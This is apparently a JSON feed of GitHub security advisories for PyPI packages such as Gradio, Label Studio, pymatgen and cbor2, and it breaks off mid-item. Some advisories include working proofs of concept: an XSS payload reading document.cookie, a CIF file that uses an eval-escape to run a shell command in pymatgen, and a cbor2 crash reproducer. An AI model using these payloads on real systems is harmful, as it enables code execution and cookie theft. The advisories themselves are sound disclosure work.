{
    "version": "https://jsonfeed.org/version/1",
    "title": "Security Advisory for Python packages hosted at PyPI.org",
    "home_page_url": "https://github.com/advisories?query=type%3Areviewed+ecosystem%3Apip",
    "feed_url": "https://azu.github.io/github-advisory-database-rss/pip.json",
    "description": "Security Advisory for Python packages hosted at PyPI.org on GitHub",
    "items": [
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>This security policy is with regards to a timing attack that allows users of Gradio apps to potentially guess the password of password-protected Gradio apps. This relies on the fact that string comparisons in Python terminate early, as soon as there is a string mismatch. Because Gradio apps are, by default, not rate-limited, a user could brute-force millions of guesses to figure out the correct username and password.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Yes, the problem has been patched in Gradio version 4.19.2 or higher. We have no knowledge of this exploit being used against users of Gradio applications, but we encourage all users to upgrade to Gradio 4.19.2 or higher.</p>\n<p>Fixed in: <a href=\"https://github.com/gradio-app/gradio/commit/e329f1fd38935213fe0e73962e8cbd5d3af6e87b\">https://github.com/gradio-app/gradio/commit/e329f1fd38935213fe0e73962e8cbd5d3af6e87b</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/gradio-app/gradio/security/advisories/GHSA-hmx6-r76c-85g9\">https://github.com/gradio-app/gradio/security/advisories/GHSA-hmx6-r76c-85g9</a></li>\n<li><a href=\"https://github.com/gradio-app/gradio/commit/e329f1fd38935213fe0e73962e8cbd5d3af6e87b\">https://github.com/gradio-app/gradio/commit/e329f1fd38935213fe0e73962e8cbd5d3af6e87b</a></li>\n<li><a href=\"https://github.com/gradio-app/gradio/releases/tag/gradio%404.19.2\">https://github.com/gradio-app/gradio/releases/tag/gradio%404.19.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-hmx6-r76c-85g9\">https://github.com/advisories/GHSA-hmx6-r76c-85g9</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-hmx6-r76c-85g9",
            "title": "[gradio] Gradio apps vulnerable to timing attacks to guess password",
            "date_modified": "2024-02-22T22:09:23.000Z",
            "date_published": "2024-02-22T22:09:22.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-hmx6-r76c-85g9"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>On all Label Studio versions prior to 1.11.0, data imported via file upload feature is not properly sanitized prior to being rendered within a <a href=\"https://labelstud.io/tags/choices\"><code>Choices</code></a> or <a href=\"https://labelstud.io/tags/labels\"><code>Labels</code></a> tag, resulting in an XSS vulnerability.</p>\n<h3 id=\"details\">Details</h3>\n<p>Need permission to use the \"data import\" function. This was reproduced on Label Studio 1.10.1.</p>\n<h3 id=\"poc\">PoC</h3>\n<ol>\n<li><p>Create a project.\n<img alt=\"Create a project\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/9b1536ad-feac-4238-a1bd-ca9b1b798673\"></p>\n</li>\n<li><p>Upload a file containing the payload using the \"Upload Files\" function.\n<img alt=\"2  Upload a file containing the payload using the Upload Files function\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/26bb7af1-1cd2-408f-9adf-61e31a5b7328\">\n<img alt=\"3  complete\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/f2f62774-1fa6-4456-9e6f-8fa1ca0a2d2e\"></p>\n</li>\n</ol>\n<p>The following are the contents of the files used in the PoC</p>\n<pre><code>{\n  \"data\": {\n    \"prompt\": \"labelstudio universe image\",\n    \"images\": [\n      {\n        \"value\": \"id123#0\",\n        \"style\": \"margin: 5px\",\n        \"html\": \"&lt;img width='400' src='https://labelstud.io/_astro/images-tab.64279c16_ZaBSvC.avif' onload=alert(document.cookie)&gt;\"\n      }\n    ]\n  }\n}\n</code></pre>\n<ol start=\"3\">\n<li><p>Select the text-to-image generation labeling template of Ranking and scoring\n<img alt=\"3  Select the text-to-image generation labelling template for Ranking and scoring\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/f227f49c-a718-4738-bc2a-807da4f97155\">\n<img alt=\"5  save\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/9b529f8a-8e99-4bb0-bdf6-bb7a95c9b75d\"></p>\n</li>\n<li><p>Select a task\n<img alt=\"4  Select a task\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/71856b7a-2b1f-44ea-99ab-fc48bc20caa7\"></p>\n</li>\n<li><p>Check that the script is running\n<img alt=\"5  Check that the script is running\" src=\"https://github.com/HumanSignal/label-studio/assets/3943358/e396ae7b-a591-4db7-afe9-5bab30b48cb9\"></p>\n</li>\n</ol>\n<h3 id=\"impact\">Impact</h3>\n<p>Malicious scripts can be injected into the code, and when linked with vulnerabilities such as CSRF, it can cause even greater damage. In particular, It can become a source of further attacks, especially when linked to social engineering.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6xv9-957j-qfhg\">https://github.com/HumanSignal/label-studio/security/advisories/GHSA-6xv9-957j-qfhg</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/pull/5232\">https://github.com/HumanSignal/label-studio/pull/5232</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/commit/5df9ae3828b98652e9fa290a19f4deedf51ef6c8\">https://github.com/HumanSignal/label-studio/commit/5df9ae3828b98652e9fa290a19f4deedf51ef6c8</a></li>\n<li><a href=\"https://github.com/HumanSignal/label-studio/releases/tag/1.11.0\">https://github.com/HumanSignal/label-studio/releases/tag/1.11.0</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26152\">https://nvd.nist.gov/vuln/detail/CVE-2024-26152</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6xv9-957j-qfhg\">https://github.com/advisories/GHSA-6xv9-957j-qfhg</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6xv9-957j-qfhg",
            "title": "[label-studio] Label Studio vulnerable to Cross-site Scripting if `<Choices>` or `<Labels>` are used in labeling config ",
            "date_modified": "2024-02-23T00:31:31.000Z",
            "date_published": "2024-02-22T21:52:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6xv9-957j-qfhg"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>An attacker able to submit many ciphertexts against a single private key, and to get responses in real-time, could recover the private key. This vulnerability has been named KyberSlash.</p>\n<p>CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:L/A:N/E:F/RL:O/RC:C</p>\n<h3 id=\"patches\">Patches</h3>\n<p>Version 0.0.6.1 and newer of PyPQC is patched.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<p>No workarounds have been reported. The 0.0.6 -&gt; 0.0.6.1 upgrade should be a drop-in replacement; it has no known breaking changes.</p>\n<h3 id=\"references\">References</h3>\n<ol>\n<li><p>This was partially patched (\"KyberSlash 1\") in the reference implementation by Peter Schwabe on December 1st, 2023.<br><a href=\"https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220\">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></p>\n</li>\n<li><p>This was reported as a security vulnerability by Daniel J. Bernstein on December 15th, 2023.<br><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></p>\n</li>\n<li><p>A webpage was stood up for authoritative reference about this by Daniel J. Bernstein on December 19th, 2023.<br><a href=\"https://kyberslash.cr.yp.to/\">https://kyberslash.cr.yp.to/</a></p>\n</li>\n<li><p>This was acknowledged as a security vulnerability by Thom Wiggers on December 19th, 2023.<br><a href=\"https://www.github.com/PQClean/PQClean/issues/533\">https://www.github.com/PQClean/PQClean/issues/533</a></p>\n</li>\n<li><p>This was completely patched (\"KyberSlash 2\") in the reference implementation by Peter Schwabe on December 29th, 2023.\n<a href=\"https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816\">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></p>\n</li>\n<li><p>A proof-of-concept exploit was published by Daniel J. Bernstein on December 30th, 2023.<br><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></p>\n</li>\n<li><p>This was completely patched in upstream by Thom Wiggers on January 25th, 2024.<br><a href=\"https://www.github.com/PQClean/PQClean/pull/534#event-11595728485\">https://www.github.com/PQClean/PQClean/pull/534#event-11595728485</a></p>\n</li>\n<li><p>This was completely patched in pypqc (including upload to PyPI) on January 26th, 2024.<br><a href=\"https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6\">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></p>\n</li>\n</ol>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577\">https://github.com/JamesTheAwesomeDude/pypqc/security/advisories/GHSA-rc4p-p3j9-6577</a></li>\n<li><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/hWqFJCucuj4/m/-Z-jm_k9AAAJ</a></li>\n<li><a href=\"https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ\">https://groups.google.com/a/list.nist.gov/g/pqc-forum/c/ldX0ThYJuBo/m/uIOqRF5BAwAJ</a></li>\n<li><a href=\"https://kyberslash.cr.yp.to\">https://kyberslash.cr.yp.to</a></li>\n<li><a href=\"https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6\">https://www.github.com/JamesTheAwesomeDude/pypqc/commit/b33fec8cd36e865f8db6215c64b2d01f429a1ed6</a></li>\n<li><a href=\"https://www.github.com/PQClean/PQClean/issues/533\">https://www.github.com/PQClean/PQClean/issues/533</a></li>\n<li><a href=\"https://www.github.com/PQClean/PQClean/pull/534#event-11595728485\">https://www.github.com/PQClean/PQClean/pull/534#event-11595728485</a></li>\n<li><a href=\"https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816\">https://www.github.com/pq-crystals/kyber/commit/11d00ff1f20cfca1f72d819e5a45165c1e0a2816</a></li>\n<li><a href=\"https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220\">https://www.github.com/pq-crystals/kyber/commit/dda29cc63af721981ee2c831cf00822e69be3220</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-rc4p-p3j9-6577\">https://github.com/advisories/GHSA-rc4p-p3j9-6577</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-rc4p-p3j9-6577",
            "title": "[pypqc] pypqc private key retrieval vulnerability",
            "date_modified": "2024-02-22T21:41:49.000Z",
            "date_published": "2024-02-22T21:41:47.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-rc4p-p3j9-6577"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"impact\">Impact</h3>\n<p>All users of mjml-python who insert untrusted data into mjml templates unless that data is checked in a very strict manner. User input like <code>&amp;lt;script&amp;gt;</code> would be rendered as <code>&lt;script&gt;</code> in the final HTML output.</p>\n<p>The attacker must be able to control some data which is later injected in an mjml template which is then send out as email to other users. The attacker could control contents of email messages sent through the platform.</p>\n<h3 id=\"patches\">Patches</h3>\n<p>The problem has been fixed in version 0.11.0 of this library. Versions before 0.10.0 are not affected by this security issue which was added as part of commit 84c495da20a91640a1ca551ace17df7f3be644aa.</p>\n<h3 id=\"workarounds\">Workarounds</h3>\n<ul>\n<li>Ensure that potentially untrusted user input does not contain any sequences which could be rendered as HTML.</li>\n</ul>\n<h3 id=\"references\">References</h3>\n<ul>\n<li>Initial issue report by @sh-at-cs in #52</li>\n</ul>\n<h3 id=\"references-1\">References</h3>\n<ul>\n<li><a href=\"https://github.com/FelixSchwarz/mjml-python/security/advisories/GHSA-578p-fxmm-6229\">https://github.com/FelixSchwarz/mjml-python/security/advisories/GHSA-578p-fxmm-6229</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26151\">https://nvd.nist.gov/vuln/detail/CVE-2024-26151</a></li>\n<li><a href=\"https://github.com/FelixSchwarz/mjml-python/issues/52\">https://github.com/FelixSchwarz/mjml-python/issues/52</a></li>\n<li><a href=\"https://github.com/FelixSchwarz/mjml-python/commit/84c495da20a91640a1ca551ace17df7f3be644aa\">https://github.com/FelixSchwarz/mjml-python/commit/84c495da20a91640a1ca551ace17df7f3be644aa</a></li>\n<li><a href=\"https://github.com/FelixSchwarz/mjml-python/commit/8d410b7a500703080bb14ed7e3d2663fe16767e6\">https://github.com/FelixSchwarz/mjml-python/commit/8d410b7a500703080bb14ed7e3d2663fe16767e6</a></li>\n<li><a href=\"https://github.com/FelixSchwarz/mjml-python/releases/tag/v0.11.0\">https://github.com/FelixSchwarz/mjml-python/releases/tag/v0.11.0</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-578p-fxmm-6229\">https://github.com/advisories/GHSA-578p-fxmm-6229</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-578p-fxmm-6229",
            "title": "[mjml] Potentially untrusted input is rendered as HTML in final output",
            "date_modified": "2024-02-22T21:41:04.000Z",
            "date_published": "2024-02-22T21:40:59.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-578p-fxmm-6229"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>If <code>pkcs12.serialize_key_and_certificates</code> is called with both:</p>\n<ol>\n<li>A certificate whose public key did not match the provided private key</li>\n<li>An <code>encryption_algorithm</code> with <code>hmac_hash</code> set (via <code>PrivateFormat.PKCS12.encryption_builder().hmac_hash(...)</code></li>\n</ol>\n<p>Then a NULL pointer dereference would occur, crashing the Python process.</p>\n<p>This has been resolved, and now a <code>ValueError</code> is properly raised.</p>\n<p>Patched in <a href=\"https://github.com/pyca/cryptography/pull/10423\">https://github.com/pyca/cryptography/pull/10423</a></p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/pyca/cryptography/security/advisories/GHSA-6vqw-3v5j-54x4\">https://github.com/pyca/cryptography/security/advisories/GHSA-6vqw-3v5j-54x4</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/pull/10423\">https://github.com/pyca/cryptography/pull/10423</a></li>\n<li><a href=\"https://github.com/pyca/cryptography/commit/97d231672763cdb5959a3b191e692a362f1b9e55\">https://github.com/pyca/cryptography/commit/97d231672763cdb5959a3b191e692a362f1b9e55</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26130\">https://nvd.nist.gov/vuln/detail/CVE-2024-26130</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-6vqw-3v5j-54x4\">https://github.com/advisories/GHSA-6vqw-3v5j-54x4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-6vqw-3v5j-54x4",
            "title": "[cryptography] cryptography NULL pointer dereference with pkcs12.serialize_key_and_certificates when called with a non-matching certificate and private key and an hmac_hash override",
            "date_modified": "2024-02-23T15:34:20.000Z",
            "date_published": "2024-02-21T18:04:40.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-6vqw-3v5j-54x4"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>A critical security vulnerability exists in the <code>JonesFaithfulTransformation.from_transformation_str()</code> method within the <code>pymatgen</code> library. This method insecurely utilizes eval() for processing input, enabling execution of arbitrary code when parsing untrusted input. This can be exploited when parsing a maliciously-created CIF file.</p>\n<h3 id=\"details\">Details</h3>\n<p>The cause of the vulnerability is in <a href=\"https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108\">pymatgen/symmetry/settings.py#L97C1-L111C108</a>. The flawed code segment involves a regular expression operation followed by the use of <code>eval()</code>.</p>\n<h4 id=\"vulnerable-code\">Vulnerable code</h4>\n<pre><code class=\"language-py\">basis_change = [\n    re.sub(r\"(?&lt;=\\w|\\))(?=\\() | (?&lt;=\\))(?=\\w) | (?&lt;=(\\d|a|b|c))(?=([abc]))\", r\"*\", string, flags=re.X)\n    for string in basis_change\n]\n\"\"\"snip\"\"\"\n([eval(x, {\"__builtins__\": None}, {\"a\": a, \"b\": b, \"c\": c}) for x in basis_change])\n</code></pre>\n<p>The use of eval, even with <code>__builtins__</code> set to <code>None</code>, is still a security risk. The <code>BuiltinImporter</code> class can be recovered with subclass traversal.</p>\n<h3 id=\"poc\">PoC</h3>\n<p>The vulnerability can be exploited as follows:</p>\n<p>Create a file <code>vuln.cif</code> with the following contents:</p>\n<pre><code>data_5yOhtAoR\n_audit_creation_date            2018-06-08\n_audit_creation_method          \"Pymatgen CIF Parser Arbitrary Code Execution Exploit\"\n\nloop_\n_parent_propagation_vector.id\n_parent_propagation_vector.kxkykz\nk1 [0 0 0]\n\n_space_group_magn.transform_BNS_Pp_abc  'a,b,[d for d in ().__class__.__mro__[1].__getattribute__ ( *[().__class__.__mro__[1]]+[\"__sub\" + \"classes__\"]) () if d.__name__ == \"BuiltinImporter\"][0].load_module (\"os\").system (\"touch pwned\");0,0,0'\n\n\n_space_group_magn.number_BNS  62.448\n_space_group_magn.name_BNS  \"P  n'  m  a'  \"\n</code></pre>\n<p>Then, parse the cif file with the following code:</p>\n<pre><code class=\"language-py\">from pymatgen.io.cif import CifParser\nparser = CifParser(\"vuln.cif\")\nstructure = parser.parse_structures()\n</code></pre>\n<h3 id=\"credits\">Credits</h3>\n<p>This vulnerability was found and disclosed by <a href=\"https://github.com/SteakEnthusiast\">William Khem-Marquez</a>.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f\">https://github.com/materialsproject/pymatgen/security/advisories/GHSA-vgv8-5cpj-qj2f</a></li>\n<li><a href=\"https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a\">https://github.com/materialsproject/pymatgen/commit/c231cbd3d5147ee920a37b6ee9dd236b376bcf5a</a></li>\n<li><a href=\"https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108\">https://github.com/materialsproject/pymatgen/blob/master/pymatgen/symmetry/settings.py#L97C1-L111C108</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-23346\">https://nvd.nist.gov/vuln/detail/CVE-2024-23346</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-vgv8-5cpj-qj2f\">https://github.com/advisories/GHSA-vgv8-5cpj-qj2f</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-vgv8-5cpj-qj2f",
            "title": "[pymatgen] pymatgen vulnerable to arbitrary code execution when parsing a maliciously crafted JonesFaithfulTransformation transformation_string",
            "date_modified": "2024-02-21T19:33:08.000Z",
            "date_published": "2024-02-21T18:04:00.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-vgv8-5cpj-qj2f"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>When ssl&nbsp;was enabled for Mongo Hook, default settings included \"allow_insecure\" which caused that certificates were not validated. This was unexpected and undocumented.\nUsers are recommended to upgrade to version 4.0.0, which fixes this issue.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-25141\">https://nvd.nist.gov/vuln/detail/CVE-2024-25141</a></li>\n<li><a href=\"https://github.com/apache/airflow/pull/37214\">https://github.com/apache/airflow/pull/37214</a></li>\n<li><a href=\"https://lists.apache.org/thread/sqgbfqngjmn45ommmrgj7hvs7fgspsgm\">https://lists.apache.org/thread/sqgbfqngjmn45ommmrgj7hvs7fgspsgm</a></li>\n<li><a href=\"http://www.openwall.com/lists/oss-security/2024/02/20/5\">http://www.openwall.com/lists/oss-security/2024/02/20/5</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-x5pm-h33q-cjrw\">https://github.com/advisories/GHSA-x5pm-h33q-cjrw</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-x5pm-h33q-cjrw",
            "title": "[apache-airflow-providers-mongo] Improper Certificate Validation in apache airflow mongo hook",
            "date_modified": "2024-02-21T02:27:37.000Z",
            "date_published": "2024-02-20T21:30:26.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-x5pm-h33q-cjrw"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Pyhtml2pdf version 0.0.6 allows an external attacker to remotely obtain</p>\n<p>arbitrary local files. This is possible because the application does not</p>\n<p>validate the HTML content entered by the user.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-1647\">https://nvd.nist.gov/vuln/detail/CVE-2024-1647</a></li>\n<li><a href=\"https://fluidattacks.com/advisories/oliver\">https://fluidattacks.com/advisories/oliver</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-p3rv-qj56-2fqx\">https://github.com/advisories/GHSA-p3rv-qj56-2fqx</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-p3rv-qj56-2fqx",
            "title": "[pyhtml2pdf] Cross-site Scripting in Pyhtml2pdf",
            "date_modified": "2024-02-21T00:15:56.000Z",
            "date_published": "2024-02-20T03:30:57.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-p3rv-qj56-2fqx"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<h3 id=\"summary\">Summary</h3>\n<p>Ever since <a href=\"https://github.com/agronholm/cbor2/pull/204\">https://github.com/agronholm/cbor2/pull/204</a> (or specifically <a href=\"https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542\">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a>) was merged, I can create a reproducible crash when running the snippet under PoC on a current Debian bullseye aarm64 on a Raspberry Pi 3 (I was <strong>not</strong> able to reproduce this on my x86_64 Laptop with Python 3.11; I suspect because there is enough memory to allocate still)</p>\n<h2 id=\"details\">Details</h2>\n<h3 id=\"poc\">PoC</h3>\n<pre><code class=\"language-py\">import json\nimport concurrent.futures\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nwith concurrent.futures.ProcessPoolExecutor() as executor:\n    future = executor.submit(test)\n    print(future.result())\n</code></pre>\n<pre><code>malloc(): unsorted double linked list corrupted\nTraceback (most recent call last):\n  File \"test.py\", line 14, in &lt;module&gt;\n    print(future.result())\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 440, in result\n    return self.__get_result()\n  File \"/usr/lib/python3.9/concurrent/futures/_base.py\", line 389, in __get_result\n    raise self._exception\nconcurrent.futures.process.BrokenProcessPool: A process in the process pool was terminated abruptly while the future was running or pending.\n</code></pre>\n<p>If one calls it without the indirection via the pool executor, a SystemError is shown that hides the buffer overflow.</p>\n<pre><code class=\"language-py\">import json\nimport cbor2\n\ndef test():\n    obj = \"x\" * 131128\n    cbor_enc = cbor2.dumps(obj)\n    return cbor2.loads(cbor_enc)\n\nprint(test())\n</code></pre>\n<pre><code>Traceback (most recent call last):\n  File \"test.py\", line 12, in &lt;module&gt;\n    print(test())\n  File \"test.py\", line 9, in test\n    return cbor2.loads(cbor_enc)\nSystemError: &lt;built-in function loads&gt; returned NULL without setting an error\n</code></pre>\n<h3 id=\"impact\">Impact</h3>\n<p>An attacker can crash a service using cbor2 to parse a CBOR binary by sending a long enough object.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m\">https://github.com/agronholm/cbor2/security/advisories/GHSA-375g-39jq-vq7m</a></li>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2024-26134\">https://nvd.nist.gov/vuln/detail/CVE-2024-26134</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/pull/204\">https://github.com/agronholm/cbor2/pull/204</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542\">https://github.com/agronholm/cbor2/commit/387755eacf0be35591a478d3c67fe10618a6d542</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df\">https://github.com/agronholm/cbor2/commit/4de6991ba29bf2290d7b9d83525eda7d021873df</a></li>\n<li><a href=\"https://github.com/agronholm/cbor2/releases/tag/5.6.2\">https://github.com/agronholm/cbor2/releases/tag/5.6.2</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-375g-39jq-vq7m\">https://github.com/advisories/GHSA-375g-39jq-vq7m</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-375g-39jq-vq7m",
            "title": "[cbor2] Potential buffer overflow in CBOR2 decoder",
            "date_modified": "2024-02-21T00:09:08.000Z",
            "date_published": "2024-02-21T00:09:03.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-375g-39jq-vq7m"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>Scrapy 1.4 allows remote attackers to cause a denial of service (memory consumption) via large files because arbitrarily many files are read into memory, which is especially problematic if the files are then individually written in a separate thread to a slow storage resource, as demonstrated by interaction between dataReceived (in core/downloader/handlers/http11.py) and S3FilesStore.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2017-14158\">https://nvd.nist.gov/vuln/detail/CVE-2017-14158</a></li>\n<li><a href=\"https://github.com/scrapy/scrapy/issues/482\">https://github.com/scrapy/scrapy/issues/482</a></li>\n<li><a href=\"http://blog.csdn.net/wangtua/article/details/75228728\">http://blog.csdn.net/wangtua/article/details/75228728</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml\">https://github.com/pypa/advisory-database/blob/8b7a4d62a95e8f605e5dfb4e0b4f299e6403dc12/vulns/scrapy/PYSEC-2017-83.yaml</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-h7wm-ph43-c39p\">https://github.com/advisories/GHSA-h7wm-ph43-c39p</a></li>\n<li><a href=\"https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml\">https://github.com/pypa/advisory-database/tree/main/vulns/scrapy/PYSEC-2017-83.yaml</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-h7wm-ph43-c39p",
            "title": "[scrapy] Scrapy denial of service vulnerability",
            "date_modified": "2024-02-20T19:56:53.000Z",
            "date_published": "2022-05-17T01:16:31.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-h7wm-ph43-c39p"
            },
            "tags": [
                "severity"
            ]
        },
        {
            "content_html": "<p>flaskparser.py in Webargs 5.x through 5.5.2 doesn't check that the Content-Type header is application/json when receiving JSON input. If the request body is valid JSON, it will accept it even if the content type is application/x-www-form-urlencoded. This allows for JSON POST requests to be made across domains, leading to CSRF.</p>\n<h3 id=\"references\">References</h3>\n<ul>\n<li><a href=\"https://nvd.nist.gov/vuln/detail/CVE-2020-7965\">https://nvd.nist.gov/vuln/detail/CVE-2020-7965</a></li>\n<li><a href=\"https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e\">https://github.com/marshmallow-code/webargs/commit/b9ee8b0aa668207a363d9fd21d967eeadb975c3e</a></li>\n<li><a href=\"https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28\">https://webargs.readthedocs.io/en/latest/changelog.html#b4-2020-01-28</a></li>\n<li><a href=\"https://webargs.readthedocs.io/en/latest/changelog.html#id11\">https://webargs.readthedocs.io/en/latest/changelog.html#id11</a></li>\n<li><a href=\"https://github.com/advisories/GHSA-fjq3-5pxw-4wj4\">https://github.com/advisories/GHSA-fjq3-5pxw-4wj4</a></li>\n</ul>\n",
            "url": "https://github.com/advisories/GHSA-fjq3-5pxw-4wj4",
            "title": "[webargs] Cross-Site Request Forgery in Webargs",
            "date_modified": "2024-02-20T15:57:22.000Z",
            "date_published": "2021-04-07T21:06:30.000Z",
            "author": {
                "name": "GitHub",
                "url": "https://github.com/advisories/GHSA-fjq3-5pxw-4wj4"
            },
            "tags": [
                "severity"
            ]
        },
        {
